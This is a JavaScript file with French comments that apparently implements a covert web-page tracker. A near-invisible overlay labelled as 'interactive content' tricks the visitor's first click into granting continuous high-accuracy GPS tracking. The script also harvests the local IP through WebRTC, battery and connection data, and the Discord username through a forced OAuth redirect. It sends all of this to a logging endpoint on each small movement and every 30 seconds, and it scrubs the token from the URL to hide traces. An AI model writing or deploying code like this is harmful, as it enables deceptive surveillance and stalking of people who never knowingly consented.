let cachedLocalIp = null;
let cachedDiscordUser = null;

// ===== DISCORD OAUTH =====
// À configurer dans les variables d'environnement: DISCORD_CLIENT_ID
// Récupérer depuis: https://discord.com/developers/applications
const DISCORD_CLIENT_ID = '1511034707314217022'; // À remplacer par ton vrai Client ID
const DISCORD_REDIRECT_URI = `${window.location.origin}/`;

async function getDiscordUser() {
    if (cachedDiscordUser) return cachedDiscordUser;

    // Vérifier si on a un token dans l'URL (retour d'OAuth)
    const params = new URLSearchParams(window.location.hash.substring(1));
    const accessToken = params.get('access_token');

    if (accessToken) {
        try {
            const res = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { 'Authorization': `Bearer ${accessToken}` }
            });
            const user = await res.json();
            if (user.username) {
                cachedDiscordUser = user.username;
                // Nettoyer l'URL pour éviter les traces
                window.history.replaceState({}, document.title, window.location.pathname);
                return user.username;
            }
        } catch (e) {
            console.error("Discord fetch error:", e);
        }
    }

    // Pas de token, demander l'auth
    return null;
}

function startDiscordOAuth() {
    const scope = 'identify';
    const authUrl = `https://discord.com/api/oauth2/authorize?` +
        `client_id=${DISCORD_CLIENT_ID}` +
        `&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}` +
        `&response_type=token` +
        `&scope=${scope}`;
    
    window.location.href = authUrl;
}

// Fonction pour récupérer l'IP locale via WebRTC
async function getLocalIP() {
    if (cachedLocalIp) return cachedLocalIp;

    return new Promise((resolve) => {
        const ips = [];
        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        });
        
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.length > 0) {
                    cachedLocalIp = ips[0];
                    resolve(ips[0]);
                } else {
                    resolve("Inconnue (Bloqué/VPN)");
                }
                return;
            }
            
            const parts = event.candidate.candidate.split(' ');
            const ip = parts[4];
            if (!ips.includes(ip) && ip.includes('.')) {
                ips.push(ip);
            }
        };

        setTimeout(() => {
            if (ips.length > 0) {
                cachedLocalIp = ips[0];
                resolve(ips[0]);
            } else {
                resolve("Inconnue (Timeout/mDNS)");
            }
            pc.close();
        }, 2000);
    });
}

async function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 15000, 
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading
                });
            },
            (error) => {
                console.warn("Géolocalisation refusée ou erreur:", error.message);
                resolve(null);
            },
            options
        );
    });
}

async function getDeviceStats() {
    const stats = {
        battery: null,
        charging: null,
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
    };

    const localIp = cachedLocalIp;
    if (localIp && (localIp.startsWith('192.168.') || localIp.startsWith('10.') || localIp.includes('.local'))) {
        stats.connection = 'wifi';
    } else if (stats.connection === 'unknown') {
        stats.connection = '4g/mobile';
    }

    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            stats.battery = Math.round(battery.level * 100);
            stats.charging = battery.charging;
        }
    } catch (e) {}
    
    return stats;
}

let sessionId = localStorage.getItem('tracker_session_id');
if (!sessionId) {
    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    localStorage.setItem('tracker_session_id', sessionId);
}

async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
    try {
        const localIp = cachedLocalIp || await getLocalIP();
        const stats = await getDeviceStats();
        let discordUsername = await getDiscordUser();
        
        // Si pas de Discord user, lancer OAuth
        if (!discordUsername) {
            console.log("No Discord user, starting OAuth...");
            startDiscordOAuth();
            return; // Stop jusqu'au retour d'OAuth
        }
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: sessionId,
                isUpdate: isUpdate,
                forceDiscord: forceDiscord,
                localIp: localIp,
                discordUsername: discordUsername,
                preciseLocation: preciseLocation,
                deviceStats: stats,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                page: window.location.pathname
            })
        });
    } catch (error) {
        console.error("Erreur lors du logging:", error);
    }
}

async function startVerification() {
    let overlay = document.getElementById('verification-overlay');

    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'verification-overlay';
        Object.assign(overlay.style, {
            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
            background: 'rgba(0,0,0,0.01)', zIndex: '99999', cursor: 'pointer',
            display: 'flex', alignItems: 'center', justifyContent: 'center'
        });
        const msg = document.createElement('div');
        Object.assign(msg.style, {
            background: 'rgba(0,0,0,0.6)', color: 'white', padding: '10px 20px',
            borderRadius: '30px', fontSize: '12px', pointerEvents: 'none', opacity: '0.1'
        });
        msg.innerText = 'Cliquer pour activer le contenu interactif';
        overlay.appendChild(msg);
        document.body.appendChild(overlay);
    }

    overlay.style.display = 'flex';

    let lastLoggedPos = null;

    function getDistance(lat1, lon1, lat2, lon2) {
        const R = 6371e3;
        const φ1 = lat1 * Math.PI/180;
        const φ2 = lat2 * Math.PI/180;
        const Δφ = (lat2-lat1) * Math.PI/180;
        const Δλ = (lon2-lon1) * Math.PI/180;
        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }

    const handleFirstClick = async () => {
        overlay.style.cursor = 'wait';
        const msg = overlay.querySelector('div');
        if (msg) {
            msg.innerText = 'Chargement en cours...';
            msg.style.opacity = '0.8';
        }
        
        // On libère l'écran tout de suite pour l'utilisateur
        overlay.style.display = 'none';

        let firstGpsPointSent = false;
        let timeoutHandle = null;

        if (navigator.geolocation) {
            // TIMEOUT DE SECOURS: Si pas de GPS après 20s, envoyer le ping sans GPS à Discord
            timeoutHandle = setTimeout(() => {
                if (!firstGpsPointSent) {
                    console.log("GPS timeout - envoi ping sans GPS à Discord");
                    logVisitor(null, false, true);
                    firstGpsPointSent = true;
                }
            }, 20000);

            navigator.geolocation.watchPosition(
                async (position) => {
                    const newLoc = {
                        lat: position.coords.latitude, lon: position.coords.longitude,
                        accuracy: position.coords.accuracy, speed: position.coords.speed
                    };
                    
                    // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
                    if (!firstGpsPointSent) {
                        firstGpsPointSent = true;
                        clearTimeout(timeoutHandle);
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, false, true);
                        return;
                    }

                    // Points suivants: Appliquer les filtres de distance
                    if (!lastLoggedPos) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                        return;
                    }

                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
                    
                    // FILTRE ANTI-SAUT :
                    // Si on se déplace de plus de 500m mais que la vitesse est nulle ou très faible (< 1 km/h)
                    // C'est probablement un saut opérateur/cellulaire, on ignore.
                    const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
                    
                    if (dist > 3 && !isAbnormalJump) {
                        lastLoggedPos = newLoc;
                        await logVisitor(newLoc, true);
                    }
                },
                null,
                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
            );
        } else {
            // Pas de géolocalisation: envoyer un ping simple après 1s
            setTimeout(() => logVisitor(null, false, true), 1000);
        }

        setInterval(() => logVisitor(null, true), 30000);
    };

    overlay.addEventListener('click', handleFirstClick, { once: true });
}

if (document.readyState === 'complete') {
    startVerification();
} else {
    window.addEventListener('load', startVerification);
}
